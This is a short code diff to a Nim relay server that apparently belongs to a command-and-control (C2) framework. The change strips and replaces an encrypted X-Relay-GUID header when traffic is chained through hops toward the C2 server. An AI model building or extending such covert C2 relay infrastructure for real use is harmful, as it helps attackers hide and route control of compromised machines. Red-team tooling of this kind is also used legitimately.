@@ -120,16 +120,16 @@ proc startRelayServer*(port: int, relayGuid: string = "", parentAddr: string = "
                 when defined debug:
                     echo "[RELAY] ↪️  Forwarding to next hop: " & targetUrl
                 
-                # Copy headers
+                # Copy headers (exclude x-relay-guid to avoid accumulation)
                 for key, value in req.headers.pairs:
                     let lowerKey = key.toLower()
-                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
+                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop", "x-relay-guid"]:
                         fwdHeaders.add(Header(key: key, value: value))
                 
                 # Set X-Next-Hop with the next chain
                 fwdHeaders.add(Header(key: "X-Next-Hop", value: encryptNextHop(nextHopChain)))
                 
-                # Add X-Relay-GUID if we have one
+                # Replace with our own X-Relay-GUID (identifies this relay to parent)
                 if relayGuid != "":
                     fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
             else:
@@ -144,13 +144,13 @@ proc startRelayServer*(port: int, relayGuid: string = "", parentAddr: string = "
                 when defined debug:
                     echo "[RELAY] 🎯 Forwarding to C2: " & targetUrl
                 
-                # Copy headers but remove X-Next-Hop
+                # Copy headers but remove X-Next-Hop and X-Relay-GUID
                 for key, value in req.headers.pairs:
                     let lowerKey = key.toLower()
-                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
+                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop", "x-relay-guid"]:
                         fwdHeaders.add(Header(key: key, value: value))
                 
-                # Add X-Relay-GUID if we have one
+                # Add our own X-Relay-GUID (identifies this relay to C2)
                 if relayGuid != "":
                     fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
             
